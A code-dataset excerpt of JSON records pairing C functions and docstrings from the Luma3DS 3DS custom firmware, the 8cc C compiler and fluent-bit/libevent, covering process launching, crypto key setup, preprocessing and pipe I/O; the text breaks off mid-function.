PROCESSFLAG_NOTIFY_TERMINATION in the process...\n    } else {\n        TRYG(loadWithoutDependencies(debug, outProcessData, programHandle, programInfo, launchFlags, exheaderInfo), cleanup);\n        // note: official pm doesn't terminate the proc. if it fails here either, but will because of the svcCloseHandle and the svcRun codepath\n    }\n\n    ProcessList_Lock(&g_manager.processList);\n    ProcessData *process = *outProcessData;\n    if (launchFlags & PMLAUNCHFLAG_QUEUE_DEBUG_APPLICATION) {\n        // saved field is different in official pm\n        // this also means official pm can't launch a title with a debug flag and an application\n        if (g_manager.debugData == NULL) {\n            g_manager.debugData = process;\n        } else {\n            res = 0xD8A05805;\n        }\n    } else {\n        si.priority = exheaderInfo->aci.local_caps.core_info.priority;\n        si.stack_size = exheaderInfo->sci.codeset_info.stack_size;\n        res = svcRun(process->handle, &si);\n        if (R_SUCCEEDED(res) && (launchFlags & PMLAUNCHFLAG_NORMAL_APPLICATION) != 0) {\n            g_manager.runningApplicationData = process;\n            notifySubscribers(0x10C);\n        }\n    }\n\n    cleanup:\n    process = *outProcessData;\n    if (process != NULL && R_FAILED(res)) {\n        svcTerminateProcess(process->handle);\n    } else if (process != NULL) {\n        // official PM sets it but forgets to clear it on failure...\n        process->flags |= (launchFlags & PMLAUNCHFLAG_NOTIFY_TERMINATION) ? PROCESSFLAG_NOTIFY_TERMINATION : 0;\n    }\n\n    ProcessList_Unlock(&g_manager.processList);\n    return res;\n}", "path": "Luma3DS/sysmodules/pm/source/launch.c", "commit_date": "2020-07-12 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "//Boyer-Moore Horspool algorithm, adapted from http://www-igm.univ-mlv.fr/~lecroq/string/node18.html#SECTION00180\n", "func_signal": "u8 *memsearch(u8 *startPos, const void *pattern, u32 size, u32 patternSize)", "code": "{\n    const u8 *patternc = (const u8 *)pattern;\n    u32 table[256];\n\n    //Preprocessing\n    for(u32 i = 0; i < 256; i++)\n        table[i] = patternSize;\n    for(u32 i = 0; i < patternSize - 1; i++)\n        table[patternc[i]] = patternSize - i - 1;\n\n    //Searching\n    u32 j = 0;\n    while(j <= size - patternSize)\n    {\n        u8 c = startPos[j + patternSize - 1];\n        if(patternc[patternSize - 1] == c && memcmp(pattern, startPos + j, patternSize - 1) == 0)\n            return startPos + j;\n        j += table[c];\n    }\n\n    return NULL;\n}", "path": "Luma3DS/sysmodules/loader/source/memory.c", "commit_date": "2019-03-15 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "// this is called before main\n", "func_signal": "void initSystem(void)", "code": "{\n    __sync_init();\n\n    assertSuccess(svcCreateEvent(&terminationRequestedEvent, RESET_STICKY));\n\n    assertSuccess(svcCreateEvent(&sessionManager.sendAllBuffersToArm9Event, RESET_ONESHOT));\n    assertSuccess(svcCreateSemaphore(&sessionManager.replySemaphore, 0, 9));\n    assertSuccess(svcCreateEvent(&sessionManager.PXISRV11CommandReceivedEvent, RESET_ONESHOT));\n    assertSuccess(svcCreateEvent(&sessionManager.PXISRV11ReplySentEvent, RESET_ONESHOT));    \n    initPXI();\n\n    for(Result res = 0xD88007FA; res == (Result)0xD88007FA; svcSleepThread(500 * 1000LL))\n    {\n        res = srvInit();\n        if(R_FAILED(res) && res != (Result)0xD88007FA)\n            svcBreak(USERBREAK_PANIC);\n    }\n\n    //__libc_init_array();\n}", "path": "Luma3DS/sysmodules/pxi/source/main.c", "commit_date": "2020-04-29 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "/*#define F(Y, C)  pow((Y) * setting->brightness * \\\n\t\t     white_point[C], 1.0/setting->gamma[C])*/\n", "func_signal": "void\ncolorramp_fill(uint16_t *gamma_r, uint16_t *gamma_g, uint16_t *gamma_b,\n\t       int size, const color_setting_t *setting)", "code": "{\n\t/* Approximate white point */\n\tfloat white_point[3];\n\tfloat alpha = (setting->temperature % 100) / 100.0;\n\tint temp_index = ((setting->temperature - 1000) / 100)*3;\n\tinterpolate_color(alpha, &blackbody_color[temp_index],\n\t\t\t  &blackbody_color[temp_index+3], white_point);\n\n\tfor (int i = 0; i < size; i++) {\n\t\tgamma_r[i] = F((double)gamma_r[i]/(UINT16_MAX+1), 0) *\n\t\t\t(UINT16_MAX+1);\n\t\tgamma_g[i] = F((double)gamma_g[i]/(UINT16_MAX+1), 1) *\n\t\t\t(UINT16_MAX+1);\n\t\tgamma_b[i] = F((double)gamma_b[i]/(UINT16_MAX+1), 2) *\n\t\t\t(UINT16_MAX+1);\n\t}\n}", "path": "Luma3DS/sysmodules/rosalina/source/redshift/colorramp.c", "commit_date": "2020-04-16 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "// MAKE SURE fsreg has been init before calling this\n", "func_signal": "static Result fsldrPatchPermissions(void)", "code": "{\n    u32 pid;\n    Result res = 0;\n    FS_ProgramInfo info;\n    ExHeader_Arm11StorageInfo storageInfo = {\n        .fs_access_info = FSACCESS_NANDRW | FSACCESS_NANDRO_RO | FSACCESS_SDMC_RW,\n    };\n\n    info.programId = 0x0004013000001302LL; // loader PID\n    info.mediaType = MEDIATYPE_NAND;\n    TRY(svcGetProcessId(&pid, CUR_PROCESS_HANDLE));\n    return FSREG_Register(pid, 0xFFFF000000000000LL, &info, &storageInfo);\n}", "path": "Luma3DS/sysmodules/loader/source/main.c", "commit_date": "2020-04-28 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "/*__thumb__*/\n", "func_signal": "static void aes_setkey(u8 keyslot, const void *key, u32 keyType, u32 mode)", "code": "{\n    u32 *key32 = (u32 *)key;\n    *REG_AESCNT = (*REG_AESCNT & ~(AES_CNT_INPUT_ENDIAN | AES_CNT_INPUT_ORDER)) | mode;\n\n    if(keyslot <= 3)\n    {\n        if((mode & AES_CNT_INPUT_ORDER) == AES_INPUT_TWLREVERSED)\n        {\n            REGs_AESTWLKEYS[keyslot][keyType][0] = key32[3];\n            REGs_AESTWLKEYS[keyslot][keyType][1] = key32[2];\n            REGs_AESTWLKEYS[keyslot][keyType][2] = key32[1];\n            REGs_AESTWLKEYS[keyslot][keyType][3] = key32[0];\n        }\n        else\n        {\n            REGs_AESTWLKEYS[keyslot][keyType][0] = key32[0];\n            REGs_AESTWLKEYS[keyslot][keyType][1] = key32[1];\n            REGs_AESTWLKEYS[keyslot][keyType][2] = key32[2];\n            REGs_AESTWLKEYS[keyslot][keyType][3] = key32[3];\n        }\n    }\n\n    else if(keyslot < 0x40)\n    {\n        *REG_AESKEYCNT = (*REG_AESKEYCNT >> 6 << 6) | keyslot | AES_KEYCNT_WRITE;\n\n        REG_AESKEYFIFO[keyType] = key32[0];\n        REG_AESKEYFIFO[keyType] = key32[1];\n        REG_AESKEYFIFO[keyType] = key32[2];\n        REG_AESKEYFIFO[keyType] = key32[3];\n    }\n}", "path": "Luma3DS/arm9/source/crypto.c", "commit_date": "2020-04-25 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "// Called before main\n", "func_signal": "void initSystem(void)", "code": "{\n    __sync_init();\n\n    //__libc_init_array();\n\n    s64 out;\n    u32 *staticBuffers = getThreadStaticBuffers();\n    staticBuffers[0] = IPC_Desc_StaticBuffer(0x110, 0);\n    staticBuffers[1] = (u32)serviceAccessListStaticBuffer;\n\n    svcGetSystemInfo(&out, 26, 0);\n    nbSection0Modules = out;\n    assertSuccess(svcCreateSemaphore(&resumeGetServiceHandleOrPortRegisteredSemaphore, 0, 64));\n\n    buildList(&freeSessionDataList, sessionDataPool, sizeof(sessionDataPool) / sizeof(SessionData), sizeof(SessionData));\n    buildList(&freeProcessDataList, processDataPool, sizeof(processDataPool) / sizeof(ProcessData), sizeof(ProcessData));\n}", "path": "Luma3DS/sysmodules/sm/source/main.c", "commit_date": "2020-12-07 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "// unsafe but what can I do?\n", "func_signal": "void miniSocLockState(void)", "code": "{\n    Result res = 0;\n    __dmb();\n    if (!exclusiveStateEntered && isServiceUsable(\"ndm:u\"))\n    {\n        ndmuInit();\n        res = NDMU_EnterExclusiveState(NDM_EXCLUSIVE_STATE_INFRASTRUCTURE);\n        if (R_SUCCEEDED(res))\n            res = NDMU_LockState(); // prevents ndm from switching to StreetPass when the lid is closed\n        exclusiveStateEntered = R_SUCCEEDED(res);\n        __dmb();\n    }\n}", "path": "Luma3DS/sysmodules/rosalina/source/minisoc.c", "commit_date": "2020-07-16 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "/* Test if the character is DBC 2nd byte */\n", "func_signal": "static int dbc_2nd (BYTE c)", "code": "{\n#if FF_CODE_PAGE == 0\t\t/* Variable code page */\n\tif (DbcTbl && c >= DbcTbl[4]) {\n\t\tif (c <= DbcTbl[5]) return 1;\t\t\t\t\t/* 2nd byte range 1 */\n\t\tif (c >= DbcTbl[6] && c <= DbcTbl[7]) return 1;\t/* 2nd byte range 2 */\n\t\tif (c >= DbcTbl[8] && c <= DbcTbl[9]) return 1;\t/* 2nd byte range 3 */\n\t}\n#elif FF_CODE_PAGE >= 900\t/* DBCS fixed code page */\n\tif (c >= DbcTbl[4]) {\n\t\tif (c <= DbcTbl[5]) return 1;\n\t\tif (c >= DbcTbl[6] && c <= DbcTbl[7]) return 1;\n\t\tif (c >= DbcTbl[8] && c <= DbcTbl[9]) return 1;\n\t}\n#else\t\t\t\t\t\t/* SBCS fixed code page */\n\tif (c != 0) return 0;\t/* Always false */\n#endif\n\treturn 0;\n}", "path": "Luma3DS/arm9/source/fatfs/ff.c", "commit_date": "2019-03-15 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "/* Copy memory to memory */\n", "func_signal": "static void mem_cpy (void* dst, const void* src, UINT cnt)", "code": "{\n\tBYTE *d = (BYTE*)dst;\n\tconst BYTE *s = (const BYTE*)src;\n\n\tif (cnt != 0) {\n\t\tdo {\n\t\t\t*d++ = *s++;\n\t\t} while (--cnt);\n\t}\n}", "path": "Luma3DS/arm9/source/fatfs/ff.c", "commit_date": "2019-03-15 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "// nn's asm has rounding errors (originally at 10^-3)\n", "func_signal": "static inline u32 luminanceToBrightness(u32 luminance, const float coeffs[3], u32 minLuminance, float pwmRatio)", "code": "{\n    float x = (float)luminance;\n    float y = coeffs[0]*x*x + coeffs[1]*x + coeffs[2];\n    y = (y <= minLuminance ? (float)minLuminance : y) / pwmRatio;\n\n    return (u32)(y + 0.5f);\n}", "path": "Luma3DS/sysmodules/rosalina/source/luminance.c", "commit_date": "2020-07-16 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "/*-----------------------------------------------------------------------*/\n/* Get current FAT time                                                  */\n/*-----------------------------------------------------------------------*/\n", "func_signal": "DWORD get_fattime( void )", "code": "{\n    DsTime dstime;\n    I2C_readRegBuf(I2C_DEV_MCU, 0x30, (u8 *)&dstime, sizeof(DsTime));\n    DWORD fattime =\n        ((DSTIMEGET(&dstime, bcd_s)&0x3F) >> 1 ) |\n        ((DSTIMEGET(&dstime, bcd_m)&0x3F) << 5 ) |\n        ((DSTIMEGET(&dstime, bcd_h)&0x3F) << 11) |\n        ((DSTIMEGET(&dstime, bcd_D)&0x1F) << 16) |\n        ((DSTIMEGET(&dstime, bcd_M)&0x0F) << 21) |\n        (((DSTIMEGET(&dstime, bcd_Y)+(2000-1980))&0x7F) << 25);\n    \n    return fattime;\n}", "path": "Luma3DS/arm9/source/fatfs/diskio.c", "commit_date": "2019-06-03 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "// Custom\n", "func_signal": "Result DebugNextApplicationByForce(bool debug)", "code": "{\n    g_debugNextApplication = debug;\n    return 0;\n}", "path": "Luma3DS/sysmodules/pm/source/launch.c", "commit_date": "2020-07-12 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "/* Fill memory block */\n", "func_signal": "static void mem_set (void* dst, int val, UINT cnt)", "code": "{\n\tBYTE *d = (BYTE*)dst;\n\n\tdo {\n\t\t*d++ = (BYTE)val;\n\t} while (--cnt);\n}", "path": "Luma3DS/arm9/source/fatfs/ff.c", "commit_date": "2019-03-15 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "// See https://github.com/LumaTeam/luma3ds_exception_dump_parser\n", "func_signal": "void installArm9Handlers(void)", "code": "{\n    vu32 *dstVeneers = (vu32 *)0x08000000;\n\n    for(u32 i = 0; i < 6; i++)\n    {\n        if(arm9ExceptionHandlerAddressTable[i] != 0)\n        {\n            dstVeneers[2 * i] = 0xE51FF004;\n            dstVeneers[2 * i + 1] = arm9ExceptionHandlerAddressTable[i];\n        }\n    }\n}", "path": "Luma3DS/arm9/source/exceptions.c", "commit_date": "2020-11-22 00:00:00", "repo_name": "LumaTeam/Luma3DS", "stars": 4771, "license": "gpl-3.0", "language": "c", "size": 8839}
{"docstring": "/*\n * #pragma\n */\n", "func_signal": "static void parse_pragma_operand(Token *tok)", "code": "{\n    char *s = tok->sval;\n    if (!strcmp(s, \"once\")) {\n        char *path = fullpath(tok->file->name);\n        map_put(once, path, (void *)1);\n    } else if (!strcmp(s, \"enable_warning\")) {\n        enable_warning = true;\n    } else if (!strcmp(s, \"disable_warning\")) {\n        enable_warning = false;\n    } else {\n        errort(tok, \"unknown #pragma: %s\", s);\n    }\n}", "path": "8cc/cpp.c", "commit_date": "2016-11-05 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "/*\n * #error and #warning\n */\n", "func_signal": "static char *read_error_message()", "code": "{\n    Buffer *b = make_buffer();\n    for (;;) {\n        Token *tok = lex();\n        if (tok->kind == TNEWLINE)\n            return buf_body(b);\n        if (buf_len(b) != 0 && tok->space)\n            buf_write(b, ' ');\n        buf_printf(b, \"%s\", tok2s(tok));\n    }\n}", "path": "8cc/cpp.c", "commit_date": "2016-11-05 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "/*\n * Constructors\n */\n", "func_signal": "static CondIncl *make_cond_incl(bool wastrue)", "code": "{\n    CondIncl *r = calloc(1, sizeof(CondIncl));\n    r->ctx = IN_THEN;\n    r->wastrue = wastrue;\n    return r;\n}", "path": "8cc/cpp.c", "commit_date": "2016-11-05 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "// Skips a block of code excluded from input by #if, #ifdef and the like.\n// C11 6.10 says that code within #if and #endif needs to be a sequence of\n// valid tokens even if skipped. However, in reality, most compilers don't\n// tokenize nor validate contents. We don't do that, too.\n// This function is to skip code until matching #endif as fast as we can.\n", "func_signal": "void skip_cond_incl()", "code": "{\n    int nest = 0;\n    for (;;) {\n        bool bol = (current_file()->column == 1);\n        skip_space();\n        int c = readc();\n        if (c == EOF)\n            return;\n        if (c == '\\'') {\n            skip_char();\n            continue;\n        }\n        if (c == '\\\"') {\n            skip_string();\n            continue;\n        }\n        if (c != '#' || !bol)\n            continue;\n        int column = current_file()->column - 1;\n        Token *tok = lex();\n        if (tok->kind != TIDENT)\n            continue;\n        if (!nest && (is_ident(tok, \"else\") || is_ident(tok, \"elif\") || is_ident(tok, \"endif\"))) {\n            unget_token(tok);\n            Token *hash = make_keyword('#');\n            hash->bol = true;\n            hash->column = column;\n            unget_token(hash);\n            return;\n        }\n        if (is_ident(tok, \"if\") || is_ident(tok, \"ifdef\") || is_ident(tok, \"ifndef\"))\n            nest++;\n        else if (nest && is_ident(tok, \"endif\"))\n            nest--;\n        skip_line();\n    }\n}", "path": "8cc/lex.c", "commit_date": "2015-04-06 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "/*\n * #define\n */\n", "func_signal": "static void read_define()", "code": "{\n    Token *name = read_ident();\n    Token *tok = lex();\n    if (is_keyword(tok, '(') && !tok->space) {\n        read_funclike_macro(name);\n        return;\n    }\n    unget_token(tok);\n    read_obj_macro(name->sval);\n}", "path": "8cc/cpp.c", "commit_date": "2016-11-05 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "// Reads an octal escape sequence.\n", "func_signal": "static int read_octal_char(int c)", "code": "{\n    int r = c - '0';\n    if (!nextoct())\n        return r;\n    r = (r << 3) | (readc() - '0');\n    if (!nextoct())\n        return r;\n    return (r << 3) | (readc() - '0');\n}", "path": "8cc/lex.c", "commit_date": "2015-04-06 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "/*\n * Macro expander\n */\n", "func_signal": "static Token *read_ident()", "code": "{\n    Token *tok = lex();\n    if (tok->kind != TIDENT)\n        errort(tok, \"identifier expected, but got %s\", tok2s(tok));\n    return tok;\n}", "path": "8cc/cpp.c", "commit_date": "2016-11-05 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "// Reads \\u or \\U escape sequences. len is 4 or 8, respecitvely.\n", "func_signal": "static int read_universal_char(int len)", "code": "{\n    Pos p = get_pos(-2);\n    unsigned int r = 0;\n    for (int i = 0; i < len; i++) {\n        char c = readc();\n        switch (c) {\n        case '0' ... '9': r = (r << 4) | (c - '0'); continue;\n        case 'a' ... 'f': r = (r << 4) | (c - 'a' + 10); continue;\n        case 'A' ... 'F': r = (r << 4) | (c - 'A' + 10); continue;\n        default: errorp(p, \"invalid universal character: %c\", c);\n        }\n    }\n    if (!is_valid_ucn(r))\n        errorp(p, \"invalid universal character: \\\\%c%0*x\", (len == 4) ? 'u' : 'U', len, r);\n    return r;\n}", "path": "8cc/lex.c", "commit_date": "2015-04-06 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "/*\n * #undef\n */\n", "func_signal": "static void read_undef()", "code": "{\n    Token *name = read_ident();\n    expect_newline();\n    map_remove(macros, name->sval);\n}", "path": "8cc/cpp.c", "commit_date": "2016-11-05 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "// Reads a string literal.\n", "func_signal": "static Token *read_string(int enc)", "code": "{\n    Buffer *b = make_buffer();\n    for (;;) {\n        int c = readc();\n        if (c == EOF)\n            errorp(pos, \"unterminated string\");\n        if (c == '\"')\n            break;\n        if (c != '\\\\') {\n            buf_write(b, c);\n            continue;\n        }\n        bool isucs = (peek() == 'u' || peek() == 'U');\n        c = read_escaped_char();\n        if (isucs) {\n            write_utf8(b, c);\n            continue;\n        }\n        buf_write(b, c);\n    }\n    buf_write(b, '\\0');\n    return make_strtok(buf_body(b), buf_len(b), enc);\n}", "path": "8cc/lex.c", "commit_date": "2015-04-06 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "/*\n * #if and the like\n */\n", "func_signal": "static Token *read_defined_op()", "code": "{\n    Token *tok = lex();\n    if (is_keyword(tok, '(')) {\n        tok = lex();\n        expect(')');\n    }\n    if (tok->kind != TIDENT)\n        errort(tok, \"identifier expected, but got %s\", tok2s(tok));\n    return map_get(macros, tok->sval) ? cpp_token_one : cpp_token_zero;\n}", "path": "8cc/cpp.c", "commit_date": "2016-11-05 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "/*\n * Special macros\n */\n", "func_signal": "static void make_token_pushback(Token *tmpl, int kind, char *sval)", "code": "{\n    Token *tok = copy_token(tmpl);\n    tok->kind = kind;\n    tok->sval = sval;\n    tok->slen = strlen(sval) + 1;\n    tok->enc = ENC_NONE;\n    unget_token(tok);\n}", "path": "8cc/cpp.c", "commit_date": "2016-11-05 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "// This is \"expand\" function in the Dave Prosser's document.\n", "func_signal": "static Token *read_expand_newline()", "code": "{\n    Token *tok = lex();\n    if (tok->kind != TIDENT)\n        return tok;\n    char *name = tok->sval;\n    Macro *macro = map_get(macros, name);\n    if (!macro || set_has(tok->hideset, name))\n        return tok;\n\n    switch (macro->kind) {\n    case MACRO_OBJ: {\n        Set *hideset = set_add(tok->hideset, name);\n        Vector *tokens = subst(macro, NULL, hideset);\n        propagate_space(tokens, tok);\n        unget_all(tokens);\n        return read_expand();\n    }\n    case MACRO_FUNC: {\n        if (!next('('))\n            return tok;\n        Vector *args = read_args(tok, macro);\n        Token *rparen = peek_token();\n        expect(')');\n        Set *hideset = set_add(set_intersection(tok->hideset, rparen->hideset), name);\n        Vector *tokens = subst(macro, args, hideset);\n        propagate_space(tokens, tok);\n        unget_all(tokens);\n        return read_expand();\n    }\n    case MACRO_SPECIAL:\n        macro->fn(tok);\n        return read_expand();\n    default:\n        error(\"internal error\");\n    }\n}", "path": "8cc/cpp.c", "commit_date": "2016-11-05 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "/*\n * #include\n */\n", "func_signal": "static char *join_paths(Vector *args)", "code": "{\n    Buffer *b = make_buffer();\n    for (int i = 0; i < vec_len(args); i++)\n        buf_printf(b, \"%s\", tok2s(vec_get(args, i)));\n    return buf_body(b);\n}", "path": "8cc/cpp.c", "commit_date": "2016-11-05 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "// Skips all newlines and returns the first non-newline token.\n", "func_signal": "static Token *skip_newlines()", "code": "{\n    Token *tok = lex();\n    while (tok->kind == TNEWLINE)\n        tok = lex();\n    unget_token(tok);\n    return tok;\n}", "path": "8cc/cpp.c", "commit_date": "2016-11-05 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "// GNU CPP outputs \"# linenum filename flags\" to preserve original\n// source file information. This function reads them. Flags are ignored.\n", "func_signal": "static void read_linemarker(Token *tok)", "code": "{\n    if (!is_digit_sequence(tok->sval))\n        errort(tok, \"line number expected, but got %s\", tok2s(tok));\n    int line = atoi(tok->sval);\n    tok = lex();\n    if (tok->kind != TSTRING)\n        errort(tok, \"filename expected, but got %s\", tok2s(tok));\n    char *filename = tok->sval;\n    do {\n        tok = lex();\n    } while (tok->kind != TNEWLINE);\n    File *file = current_file();\n    file->line = line;\n    file->name = filename;\n}", "path": "8cc/cpp.c", "commit_date": "2016-11-05 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "/*\n * #-directive\n */\n", "func_signal": "static void read_directive(Token *hash)", "code": "{\n    Token *tok = lex();\n    if (tok->kind == TNEWLINE)\n        return;\n    if (tok->kind == TNUMBER) {\n        read_linemarker(tok);\n        return;\n    }\n    if (tok->kind != TIDENT)\n        goto err;\n    char *s = tok->sval;\n    if (!strcmp(s, \"define\"))            read_define();\n    else if (!strcmp(s, \"elif\"))         read_elif(hash);\n    else if (!strcmp(s, \"else\"))         read_else(hash);\n    else if (!strcmp(s, \"endif\"))        read_endif(hash);\n    else if (!strcmp(s, \"error\"))        read_error(hash);\n    else if (!strcmp(s, \"if\"))           read_if();\n    else if (!strcmp(s, \"ifdef\"))        read_ifdef();\n    else if (!strcmp(s, \"ifndef\"))       read_ifndef();\n    else if (!strcmp(s, \"import\"))       read_include(hash, tok->file, true);\n    else if (!strcmp(s, \"include\"))      read_include(hash, tok->file, false);\n    else if (!strcmp(s, \"include_next\")) read_include_next(hash, tok->file);\n    else if (!strcmp(s, \"line\"))         read_line();\n    else if (!strcmp(s, \"pragma\"))       read_pragma();\n    else if (!strcmp(s, \"undef\"))        read_undef();\n    else if (!strcmp(s, \"warning\"))      read_warning(hash);\n    else goto err;\n    return;\n\n  err:\n    errort(hash, \"unsupported preprocessor directive: %s\", tok2s(tok));\n}", "path": "8cc/cpp.c", "commit_date": "2016-11-05 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "/*\n * Public intefaces\n */\n", "func_signal": "static Token *maybe_convert_keyword(Token *tok)", "code": "{\n    if (tok->kind != TIDENT)\n        return tok;\n    int id = (intptr_t)map_get(keywords, tok->sval);\n    if (!id)\n        return tok;\n    Token *r = copy_token(tok);\n    r->kind = TKEYWORD;\n    r->id = id;\n    return r;\n}", "path": "8cc/cpp.c", "commit_date": "2016-11-05 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "// Reads a \\x escape sequence.\n", "func_signal": "static int read_hex_char()", "code": "{\n    Pos p = get_pos(-2);\n    int c = readc();\n    if (!isxdigit(c))\n        errorp(p, \"\\\\x is not followed by a hexadecimal character: %c\", c);\n    int r = 0;\n    for (;; c = readc()) {\n        switch (c) {\n        case '0' ... '9': r = (r << 4) | (c - '0'); continue;\n        case 'a' ... 'f': r = (r << 4) | (c - 'a' + 10); continue;\n        case 'A' ... 'F': r = (r << 4) | (c - 'A' + 10); continue;\n        default: unreadc(c); return r;\n        }\n    }\n}", "path": "8cc/lex.c", "commit_date": "2015-04-06 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "// Reads from a string as if the string is a content of input file.\n// Convenient for evaluating small string snippet contaiing preprocessor macros.\n", "func_signal": "void read_from_string(char *buf)", "code": "{\n    stream_stash(make_file_string(buf));\n    Vector *toplevels = read_toplevels();\n    for (int i = 0; i < vec_len(toplevels); i++)\n        emit_toplevel(vec_get(toplevels, i));\n    stream_unstash();\n}", "path": "8cc/cpp.c", "commit_date": "2016-11-05 00:00:00", "repo_name": "rui314/8cc", "stars": 6023, "license": "mit", "language": "c", "size": 1309}
{"docstring": "/* Blocking write until send 'count bytes */\n", "func_signal": "ssize_t flb_pipe_write_all(int fd, const void *buf, size_t count)", "code": "{\n    ssize_t bytes;\n    size_t total = 0;\n\n    do {\n        bytes = flb_pipe_w(fd, (const char *) buf + total, count - total);\n        if (bytes == -1) {\n            if (FLB_PIPE_WOULDBLOCK()) {\n                /*\n                 * This could happen, since this function goal is not to\n                 * return until all data have been read, just sleep a little\n                 * bit (0.05 seconds)\n                 */\n                flb_time_msleep(50);\n                continue;\n            }\n            return -1;\n        }\n        else if (bytes == 0) {\n            /* Broken pipe ? */\n            flb_errno();\n            return -1;\n        }\n        total += bytes;\n\n    } while (total < count);\n\n    return total;\n}", "path": "fluent-bit/src/flb_pipe.c", "commit_date": "2020-09-29 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "/* Append the addrinfo 'append' to the end of 'first', and return the start of\n * the list.  Either element can be NULL, in which case we return the element\n * that is not NULL. */\n", "func_signal": "struct evutil_addrinfo *\nevutil_addrinfo_append_(struct evutil_addrinfo *first,\n    struct evutil_addrinfo *append)", "code": "{\n\tstruct evutil_addrinfo *ai = first;\n\tif (!ai)\n\t\treturn append;\n\twhile (ai->ai_next)\n\t\tai = ai->ai_next;\n\tai->ai_next = append;\n\n\treturn first;\n}", "path": "fluent-bit/lib/monkey/mk_core/deps/libevent/evutil.c", "commit_date": "2016-12-21 00:00:00", "repo_name": "fluent/fluent-bit", "stars": 5221, "license": "apache-2.0", "language": "c", "size": 89495}
{"docstring": "/* Test whether we have an ipv4 interface and an ipv6 interface.  Return 0 if\n * the test seemed successful. */\n", "func_signal": "static int\nevutil_check_interfaces(int force_recheck)", "code": "{\n\tevutil_socket_t fd = -1;\n\tstruct sockaddr_in sin, sin_out;\n\tstruct sockaddr_in6 sin6, sin6_out;\n\tev_socklen_t sin_out_len = sizeof(sin_out);\n\tev_socklen_t sin6_out_len = sizeof(sin6_out);\n\tint r;\n\tif (have_checked_interfaces && !force_recheck)\n\t\treturn 0;\n\n\tif (evutil_check_ifaddrs() == 0) {\n\t\t/* Use a nice sane interface, if this system has one. */\n\t\treturn 0;\n\t}\n\n\t/* Ugh. There was no nice sane interface.  So to check whether we have\n\t * an interface open for a given protocol, will try to make a UDP\n\t * 'connection' to a remote host on the internet.  We don't actually\n\t * use it, so the address doesn't matter, but we want to pick one that\n\t * keep us from using a host- or link-local interface. */\n\tmemset(&sin, 0, sizeof(sin));\n\tsin.sin_family = AF_INET;\n\tsin.sin_port = htons(53);\n\tr = evutil_inet_pton(AF_INET, \"18.244.0.188\", &sin.sin_addr);\n\tEVUTIL_ASSERT(r);\n\n\tmemset(&sin6, 0, sizeof(sin6));\n\tsin6.sin6_family = AF_INET6;\n\tsin6.sin6_port = htons(53);\n\tr = evutil_inet_pton(AF_INET6, \"2001:4860:b002::68\", &sin6.sin6_addr);\n\tEVUTIL_ASSERT(r);\n\n\tmemset(&sin_out, 0, 